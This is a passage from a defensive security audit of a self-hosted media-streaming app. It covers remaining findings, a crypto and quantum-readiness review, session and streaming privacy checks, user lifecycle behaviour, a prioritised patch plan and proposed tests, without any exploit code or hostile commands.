- **Fix.** Keep as-is. Document the intent.

### F-17 — No CSRF tokens (acceptable today, will become a problem if cookie SameSite is loosened)
- **Severity:** INFO | **Confidence:** HIGH
- **Affected:** All state-changing endpoints.
- **Evidence.** Defense rests on `SameSite=Lax` + same-origin fetches. As long as SameSite stays Lax and there is no CORS allowlist, CSRF is structurally hard.
- **Fix.** Keep as-is. If you ever add a public, cross-origin admin embed, add an explicit CSRF token.

### F-18 — Mass-row admin endpoints have no pagination cursor
- **Severity:** LOW | **Confidence:** MEDIUM
- **Affected:** [routes/admin.py:467-474](backend/app/routes/admin.py#L467-L474) (`/audit?limit≤500`), session list, etc.
- **Evidence.** `limit` capped at 500; no offset/cursor.
- **Fix.** Add cursor pagination on `created_at, id`.

### F-19 — Path traversal protection is correct, but only in the local-stream path
- **Severity:** INFO | **Confidence:** HIGH
- **Affected:** [backend/app/media_stream.py:19-29](backend/app/media_stream.py#L19-L29) (`ensure_media_path_within_root`).
- **Evidence.** `Path.resolve().relative_to(media_root)` is the right pattern; throws 403 on escape. Verified used by `build_stream_response` and the download handler. Cloud streams take a different path that does not need the check (the path is opaque).

### F-20 — Helper download endpoint serves zips with no integrity check exposed to the client
- **Severity:** INFO | **Confidence:** MEDIUM
- **Affected:** [routes/desktop_helper.py:99-129](backend/app/routes/desktop_helper.py#L99-L129)
- **Evidence.** Zip is served via `FileResponse`, no checksum or signature in the response or in the manifest. If the helper directory ever ends up writable by something other than the operator, you can swap binaries.
- **Fix.** Embed a SHA-256 in the manifest (`get_helper_release_download_path` already returns metadata) and have the helper verify before unpacking. Sign the manifest itself if you want supply-chain resistance.

### F-21 — Empty grep for `dangerouslySetInnerHTML` (positive finding)
- **Severity:** INFO | **Confidence:** HIGH
- React app does not use `dangerouslySetInnerHTML`, `document.write`, or raw `innerHTML`. XSS surface is reduced to F-01 (server-side served content) and any future addition.

---

## D. Crypto & Quantum-Readiness Review

### Inventory of crypto in the app

| Use | Where | Algorithm | Assessment |
|---|---|---|---|
| Password hashing | [security.py:16-26](backend/app/security.py#L16-L26) | PBKDF2-HMAC-SHA256, 600,000 iterations, 16-byte salt | OK; matches NIST 2023 guidance. Argon2id would be better but is not urgent. |
| Password verification | [security.py:34-51](backend/app/security.py#L34-L51) | PBKDF2 + `hmac.compare_digest` | Constant-time compare; correct. |
| Session token | [security.py:54-55](backend/app/security.py#L54-L55) | `secrets.token_urlsafe(48)` (~256 bits effective) | Good entropy. |
| Session token DB hash | [security.py:58-59](backend/app/security.py#L58-L59) | SHA256(secret + ":" + token) | Functionally OK; HMAC-SHA256 would be conventional. See F-13. |
| Download / native-playback / desktop-handoff token hash | [account_access_service.py:36-39](backend/app/services/account_access_service.py#L36-L39), [native_playback_service.py](backend/app/services/native_playback_service.py) | SHA256(namespace + secret + value) | Same as above. |
| Invite-code hash | [account_access_service.py:84](backend/app/services/account_access_service.py#L84) | SHA256-derived | Same. |
| Login rate-limit bucket | [auth.py:79-83](backend/app/auth.py#L79-L83) | SHA256(IP + UA) | Used as map key; not security-critical. |
| Backup file integrity | [backup_service.py](backend/app/services/backup_service.py) | SHA-256 | Identifier / integrity, not security. |
| Media fingerprinting | [media_scan.py](backend/app/media_scan.py), [library_presentation_service.py](backend/app/services/library_presentation_service.py) | SHA-1 / SHA-256 | Identifier; SHA-1 here is not a security use, OK. |
| OAuth state | [cloud_provider_auth_service.py:82-99](backend/app/services/cloud_provider_auth_service.py#L82-L99) | `generate_session_token()` round-trip via DB | Server-validated; good. |
| TLS | Delegated to Tailscale (and to whatever reverse proxy the operator deploys) | Out of scope | App does not own TLS; correct call. |
| Public-key crypto | None in app code | n/a | Nothing to migrate. |
| Symmetric encryption | None in app code | n/a | Backups and at-rest data are not encrypted by the app (see F-05). |

### Quantum-readiness analysis

- **What's at risk from CRQC (cryptographically relevant quantum computer)?** Public-key crypto: RSA, ECDSA, Ed25519, X25519, classic DH. Elvern uses **none** of those directly in app code. TLS public-key crypto is outside the app's responsibility — track Tailscale's roadmap for hybrid PQC and your reverse-proxy's TLS stack.
- **What's NOT urgent?** SHA-256 (still effectively 128 bits of pre-image after Grover; long passwords + 600k PBKDF2 iterations + 16-byte salt remain resistant for the foreseeable future). `secrets.token_urlsafe(48)` gives 256 bits which keeps 128 bits effective post-Grover — fine. Symmetric ciphers: none used today.
- **What to plan for, with no urgency:**
  1. **Password hashing migration** to Argon2id (not because of quantum, but because Argon2id is memory-hard which is friendlier to the realistic attacker than PBKDF2). Add a versioned hash format so you can re-hash on next successful login.
  2. **Backup encryption** — when you add it (see F-05), use AES-256-GCM with a per-install key derived via Argon2id from a passphrase. Don't roll your own AEAD.
  3. **TLS / transport** — track Tailscale's PQC roadmap. Until they ship it, you ride the same TLS that the rest of the internet does. Don't try to layer PQC inside the app.

### Practical migration plan

1. **Immediate (no urgency from PQC; do for general hygiene):**
   - F-13: switch the four token-hashing functions to HMAC-SHA256.
   - F-04: cut session TTL default to 7 days, rotate on password change.
2. **Medium term (next quarter):**
   - Add a versioned password-hash field (`pbkdf2_sha256$...` → `argon2id$v=19$m=...$t=...$p=...`); re-hash on login when an old format is detected.
   - Add an explicit "crypto inventory" doc in `docs/` matching the table above so future contributors know what's load-bearing.
3. **Future PQC / hybrid-readiness (12–24 months):**
   - When NIST ML-KEM / ML-DSA become widely available in TLS stacks, the path is: enable them in the reverse proxy / Tailscale layer. **Do not** roll your own PQC in app code.
   - If Elvern ever needs app-level signed objects (e.g. signed update manifests for the desktop helper), use a vetted library and start with hybrid X25519 + ML-KEM-768 / Ed25519 + ML-DSA-65.

### What NOT to change because changing it adds risk

- Don't replace PBKDF2 with a hand-rolled scheme.
- Don't replace `hashlib.sha256` calls with custom hashes for "speed".
- Don't add a custom AEAD or "signing" scheme for cookies. The current design (DB-backed opaque tokens) is *better* than rolling stateless JWT-style signed cookies.
- Don't add CORS or relax `SameSite` to "improve" mobile flows; the current setup is what makes CSRF a non-event.
- Don't bind to `0.0.0.0` "to test on the LAN" without first fixing F-03.

---

## E. Download / Streaming / Network Privacy Review

| Question | Finding |
|---|---|
| Can media URLs be reused? | `/api/stream/{id}` and `/api/hls/...` require the cookie; reuse only by the same logged-in user. `/api/download/sessions/{token}` requires cookie+token, bound to user_id and auth_session_id. `/api/native-playback/session/{id}/stream` requires only the bearer token (see F-02 — this is the loose path). |
| Do they expire? | Browser playback: live with the auth cookie (30 days default). Mobile/Route 2 sessions: 15 minutes ([config.py:243](backend/app/config.py#L243)). Download sessions: 10 minutes ([account_access_service.py:33](backend/app/services/account_access_service.py#L33)). Native external-player sessions: 12 hours default, range 10 min – 24 h. |
| Bound to user/session/device? | Browser/HLS/download/Mobile: yes. Native external: bound to `user_id`; `auth_session_id` is intentionally NULL — see F-02. |
| Survive logout? | All except native external-player sessions: no. Native external-player sessions: yes — see F-02. |
| Survive admin per-session revoke? | All except native external-player sessions: yes. Same gap. |
| Survive admin disable user? | All: no — `revoke_sessions_for_user_in_connection` catches every table including the decoupled native sessions ([auth.py:574-593](backend/app/auth.py#L574-L593)). |
| Visible in DevTools Network? | The session cookie is `HttpOnly` and not visible. Browser stream URLs are; download token URL is (`/api/download/sessions/{token}`); HLS manifest URLs are. Native playback URL with `?token=` is NOT visible because that one happens via deep-link, not a browser fetch — but a browser-rendered page that happens to set `window.location = "vlc-x-callback://..."` would expose it once. |
| What filenames are exposed? | The browser sees: original filename (in `original_filename` field of every library row, in download responses, and in `Content-Disposition` headers on download). Logs see: original filename in native-playback debug log (F-09). |
| What is cached by browser/PWA/SW? | The service worker self-unregisters; nothing is service-worker-cached. The browser cache: the HLS manifest is `Cache-Control: private, no-store`; raw stream responses default to FastAPI's headers — verified for HLS, NOT explicitly set on `/api/stream/{id}` or download endpoints, so the browser may HTTP-cache range responses. Acceptable for private deployment but worth pinning to `private, no-store` on streams too. |
| Recommended changes | F-02 (revoke decoupled sessions on logout), F-08 (stop returning `file_path`/`original_filename` to non-admins), F-09 (move debug log to debug level + redact filename), F-10 (prefer header over query token), and add `Cache-Control: private, no-store` to `/api/stream/{id}` and download responses. |

---

## F. Admin / User Lifecycle Review

| Lifecycle event | Behavior | OK? |
|---|---|---|
| Admin disables user (`enabled=False` via `PATCH /api/admin/users/{id}`) | `update_user` sets `enabled=0`; `revoke_sessions_for_user_in_connection` revokes all auth sessions, all native playback sessions (including decoupled), all desktop handoffs. Mobile manager's in-memory sessions invalidated via `_invalidate_user_sessions_if_available`. Any future request fails because `get_user_by_session_token` checks `u.enabled = 1`. | YES |
| Admin deletes user | `delete_user` requires admin password + `confirm`; cascade delete; mobile sessions invalidated. | YES |
| Admin revokes a *single* session (`POST /api/admin/sessions/{id}/revoke`) | `_revoke_session_ids` revokes the auth session AND `native_playback_sessions WHERE auth_session_id IN (...)` AND `desktop_vlc_handoffs WHERE auth_session_id IN (...)`. **Decoupled native sessions for that same user are NOT revoked.** | NO — see F-02 |
| User logs out (`POST /api/logout`) | `destroy_session` revokes the auth session and any coupled native/desktop rows. **Decoupled native sessions are NOT revoked.** | NO — see F-02 |
| User changes own password / admin changes user's password | Password hash updated. **Existing sessions are NOT revoked.** | NO — see F-04 |
| User role demoted from admin | Role changed in DB. Existing sessions stay; the next request reads the new role from the JOIN, so admin endpoints fail for the old session (effectively immediate) but the cookie itself keeps working as a regular user. Acceptable, but worth surfacing to the admin actor. | LIKELY OK |
| Active streams when user disabled | Native/desktop revoked at the DB level immediately; the next stream-validator check (every 0.25s for browser, every 5s for external) returns `revoked` and the stream cuts off. Range-based clients reconnect → 401. | YES |

---

## G. Recommended Patch Plan

**Must fix before public-ish release (i.e., before exposing to the family LAN, which is the target audience):**
- F-01 (assistant XSS) — block non-image MIME on upload, set nosniff/CSP, never serve uploader-supplied `Content-Type` inline.
- F-02 (logout doesn't revoke external-player sessions) — extend `destroy_session` and `_revoke_session_ids` to catch decoupled rows for the same user since their last login.
- F-03 (`PRIVATE_NETWORK_ONLY` is decorative) — either enforce or remove.
- F-04 (30-day session TTL + no rotation on password change) — drop default to 7d, revoke sessions on password change.
- F-06 (no global security headers) — add `SecurityHeadersMiddleware`.

**Should fix soon:**
- F-05 (backup contents) — make env exclusion the API default, add encryption guidance.
- F-07 (admin invite-code localStorage) — show once, don't persist.
- F-08 (`file_path`/`original_filename` leakage) — strip from non-admin responses.
- F-09 (native debug log content) — demote and redact.
- F-10 (token-in-query) — prefer Authorization header.
- F-11 (XFF + UA bucket) — gate XFF on trust setting; bucket on IP+username.

**Nice to have:**
- F-12 (streaming upload size cap).
- F-13 (HMAC instead of plain SHA-256 with concat).
- F-15 (`__Host-` cookie prefix).
- F-18 (cursor pagination on admin lists).
- F-20 (sign helper releases).

**Crypto / PQC future-proofing (no urgency):**
- Versioned password hash → Argon2id migration on next login.
- Backup encryption with AES-256-GCM + Argon2id-derived key.
- Track Tailscale + reverse-proxy TLS for hybrid PQC.

---

## H. Tests to Add

Backend (`backend/tests/`):
- `test_assistant_attachment_xss.py` — upload `text/html` should 400; uploaded image still serves with `nosniff`; CSP header present.
- Extend `test_auth_sessions.py` — logout revokes decoupled native playback sessions for the same user since last login; admin per-session revoke does too.
- New `test_security_headers.py` — every router returns `X-Content-Type-Options: nosniff`, `Content-Security-Policy: default-src 'self'; ...`, `Referrer-Policy`.
- Extend `test_security.py` — new password-hash test for HMAC migration; backup default excludes env file.
- New `test_private_network_only_enforcement.py` — startup raises if private_network_only=True and bind_host=0.0.0.0.
- New `test_library_path_leak.py` — `/api/library` and `/api/library/item/{id}` for a standard user contain no `file_path` and no `original_filename`; admin still does.
- New `test_native_playback_logging.py` — INFO-level capture does not contain `original_filename`.

Frontend (`frontend/src`):
- `passwordAutofillGuards` already exists — extend with a test that confirms invite codes are not persisted in localStorage after AdminPage refresh.
- A `securityHeaders` Playwright e2e test if you have Playwright; otherwise integration test via Vitest hitting a stubbed server.

E2E / manual:
- "VLC handoff after logout": open VLC handoff on iOS, log out from web, attempt to keep streaming → expect 401.
- "DevTools privacy": load `/api/library` as a standard user, confirm no host paths in JSON.
- "Backup contents": create checkpoint via API with default args, unzip, confirm no `deploy/env/elvern.env`.

---

## I. Questions / Assumptions

Genuinely blocking only the patch decisions, not the audit conclusions:

1. **Is the `private_network_only` toggle meant to be enforced or just informational?** That decides whether F-03's fix is "enforce it" or "remove it". I assumed enforce, since the README markets a private perimeter.
2. **Is the 30-day session lifetime a deliberate UX choice for trusted family devices?** If yes, the F-04 fix should be "rotate on password change but keep 30d default"; if no, the F-04 fix should also drop the default to 7d.
3. **Is the assistant attachment view used by admins to inspect arbitrary user uploads?** That changes whether the F-01 fix should hard-block `text/html` (and other non-image) on upload, or instead always-attachment-disposition them. I assumed admins should be able to download text/log files but never execute HTML.
4. **Backup workflow expectations.** If the documented workflow already says "store backups encrypted off-host with age/restic", then F-05's recommended fix is to update the docs and the manifest warning, not to add in-app encryption.

Assumptions made when no signal was available:
- The Tailscale-only deployment story is the production target. The audit grades all "external attacker" findings as MEDIUM not HIGH because of this.
- `ELVERN_BIND_HOST` stays 127.0.0.1 in practice (the install.sh confirms this default).
- Admins are also operators (one and the same person), so admin XSS is functionally a root compromise.

---

*End of audit.*
